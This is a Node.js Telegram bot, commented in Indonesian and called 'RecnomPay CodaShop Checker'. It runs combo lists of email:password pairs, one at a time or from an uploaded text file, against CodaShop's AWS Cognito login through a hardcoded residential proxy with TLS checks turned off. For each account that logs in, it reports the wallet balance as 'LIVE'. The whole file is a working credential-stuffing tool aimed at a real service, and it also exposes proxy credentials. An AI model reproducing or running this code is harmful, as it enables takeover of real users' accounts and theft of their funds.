process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0";

const { Telegraf } = require('telegraf');
const axios = require('axios');
const { HttpsProxyAgent } = require('https-proxy-agent');

const bot = new Telegraf(process.env.BOT_TOKEN);
const proxyAgent = new HttpsProxyAgent('http://8998c0d8430265a3c9ab:6b2739b4b177724e@gw.dataimpulse.com:823');

// ==========================================
// FUNGSI INTI PENGECEKAN API
// ==========================================
async function checkAccount(username, password) {
  try {
    const authPayload = JSON.stringify({
      AuthFlow: "USER_PASSWORD_AUTH",
      ClientId: "437f3u0sfh7h0av5rlrrjdtmsb",
      AuthParameters: { USERNAME: username, PASSWORD: password },
      ClientMetadata: { country_code: "ph", lang_code: "en" }
    });

    const authReq = await axios.post("https://cognito-idp.ap-southeast-1.amazonaws.com/", authPayload, {
      headers: {
        "x-amz-target": "AWSCognitoIdentityProviderService.InitiateAuth",
        "Content-Type": "application/x-amz-json-1.1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
      },
      httpsAgent: proxyAgent,
      validateStatus: () => true,
      timeout: 15000
    });

    const resData = authReq.data;

    if (resData && resData.AuthenticationResult) {
      const idToken = resData.AuthenticationResult.IdToken;

      const walletReq = await axios.get("https://wallet-api.codacash.com/user/wallet", {
        headers: {
          "Authorization": idToken,
          "x-country-code": "608",
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        },
        httpsAgent: proxyAgent,
        validateStatus: () => true,
        timeout: 10000
      });

      const balance = walletReq.data?.data?.balanceAmount || 0;
      return { status: 'live', balance: balance, msg: 'Success' };
    } else {
      const msg = resData?.__type ? resData.__type.replace('Exception', '') : 'Invalid Credentials';
      return { status: 'die', msg: msg };
    }
  } catch (error) {
    return { status: 'error', msg: 'Proxy Error/Timeout' };
  }
}

// ==========================================
// HANDLER: /START & /CODASHOP (Satuan)
// ==========================================
bot.start((ctx) => {
  ctx.reply('Halo! RecnomPay CodaShop Checker siap.\n\n- Cek Satuan: /codashop email:pass\n- Cek Massal: Langsung kirim file .txt ke bot ini.');
});

bot.command('codashop', async (ctx) => {
  const args = ctx.message.text.split(' ');
  if (args.length < 2) return ctx.reply('❌ Format Salah!\nGunakan: /codashop username:password');

  const combo = args[1].replace(/[|;\s]/g, ':').split(':');
  if (combo.length < 2) return ctx.reply('❌ Format Salah!\nGunakan: /codashop username:password');

  const username = combo[0].trim();
  const password = combo[1].trim();

  const loadingMsg = await ctx.reply('⏳ <i>RecnomPay Checker sedang memproses...</i>', { parse_mode: 'HTML' });

  const result = await checkAccount(username, password);

  if (result.status === 'live') {
    await ctx.telegram.editMessageText(ctx.chat.id, loadingMsg.message_id, undefined,
      `✅ <b>LIVE ACCOUNT</b>\n━━━━━━━━━━━━━━━━━━\nAcc: <code>${username}:${password}</code>\nBalance: <b>${result.balance}</b>\n━━━━━━━━━━━━━━━━━━\n🤖 <i>RecnomPay Checker</i>`,
      { parse_mode: 'HTML' }
    );
  } else {
    const icon = result.status === 'die' ? '❌ <b>DIE ACCOUNT</b>' : '⚠️ <b>ERROR ACCOUNT</b>';
    await ctx.telegram.editMessageText(ctx.chat.id, loadingMsg.message_id, undefined,
      `${icon}\n━━━━━━━━━━━━━━━━━━\nAcc: <code>${username}:${password}</code>\nMsg: ${result.msg}\n━━━━━━━━━━━━━━━━━━`,
      { parse_mode: 'HTML' }
    );
  }
});

// ==========================================
// HANDLER: UPLOAD FILE .TXT (Menyiapkan Mass Check)
// ==========================================
bot.on('document', async (ctx) => {
  const doc = ctx.message.document;
  
  if (!doc.file_name.endsWith('.txt')) {
    return ctx.reply('❌ Mohon kirim file dengan format .txt yang berisi list combo.');
  }

  // File ID disimpan di callback data tombol agar nanti bisa didownload saat tombol diklik
  ctx.reply(`📄 File <b>${doc.file_name}</b> diterima!\n\nSilakan klik tombol di bawah untuk memulai pengecekan (Max 30 baris).`, {
    parse_mode: 'HTML',
    reply_markup: {
      inline_keyboard: [
        [
          // Kita kirimkan file_id di dalam callback_data
          { text: '▶️ Mulai Mass Check', callback_data: `start_mass_${doc.file_id}` }
        ]
      ]
    }
  });
});

// ==========================================
// HANDLER: ACTION BUTTON (Memulai Mass Check)
// ==========================================
// Regex ini menangkap callback_data yang dimulai dengan 'start_mass_'
bot.action(/start_mass_(.+)/, async (ctx) => {
  const fileId = ctx.match[1]; // Mengambil file_id dari regex match
  
  // Hilangkan loading di tombol Telegram
  await ctx.answerCbQuery('Memulai pengecekan massal...');

  // Edit pesan tombol menjadi pesan loading
  await ctx.editMessageText('📥 <i>Mengunduh file dan memproses data... Mohon tunggu.</i>', { parse_mode: 'HTML' });

  try {
    // Download isi file menggunakan file_id yang didapat dari tombol
    const fileLink = await ctx.telegram.getFileLink(fileId);
    const response = await axios.get(fileLink.href);
    const textData = response.data;

    // Filter baris
    const lines = textData.split('\n').map(l => l.trim()).filter(l => l.includes(':'));
    if (lines.length === 0) {
      return ctx.editMessageText('❌ Tidak ada format combo yang valid di dalam file.');
    }

    const maxLines = lines.slice(0, 30);
    let liveResult = '';
    let liveCount = 0;
    let dieCount = 0;

    // Proses pengecekan paralel
    const checkPromises = maxLines.map(async (line) => {
      const combo = line.replace(/[|;\s]/g, ':').split(':');
      if (combo.length >= 2) {
        const username = combo[0].trim();
        const password = combo[1].trim();
        const res = await checkAccount(username, password);
        return { username, password, res };
      }
      return null;
    });

    const results = await Promise.all(checkPromises);

    // Rekap
    results.forEach(item => {
      if (item && item.res.status === 'live') {
        liveCount++;
        liveResult += `<code>${item.username}:${item.password}</code> | Bal: <b>${item.res.balance}</b>\n`;
      } else if (item) {
        dieCount++;
      }
    });

    let finalMsg = `<b>✅ REKAP MASS CHECKING</b>\n━━━━━━━━━━━━━━━━━━\n`;
    if (liveCount > 0) {
      finalMsg += liveResult;
    } else {
      finalMsg += `<i>Tidak ada akun yang Live.</i>\n`;
    }
    finalMsg += `━━━━━━━━━━━━━━━━━━\n📈 <b>Statistik:</b>\nTotal Diproses: ${maxLines.length}\nLive: ${liveCount} | Die/Error: ${dieCount}\n🤖 <i>RecnomPay Checker Selesai</i>`;

    // Tampilkan hasil akhir
    await ctx.editMessageText(finalMsg, { parse_mode: 'HTML' });

  } catch (error) {
    console.error(error);
    await ctx.editMessageText('❌ Gagal memproses file. Pastikan file tidak terlalu besar.');
  }
});

// ==========================================
// VERCEL SERVERLESS HANDLER
// ==========================================
module.exports = async (req, res) => {
  try {
    if (req.method === 'POST') {
      await bot.handleUpdate(req.body, res);
    } else {
      res.status(200).send('RecnomPay Bot berjalan dengan baik!');
    }
  } catch (error) {
    res.status(500).send('Terjadi kesalahan pada server');
  }
};
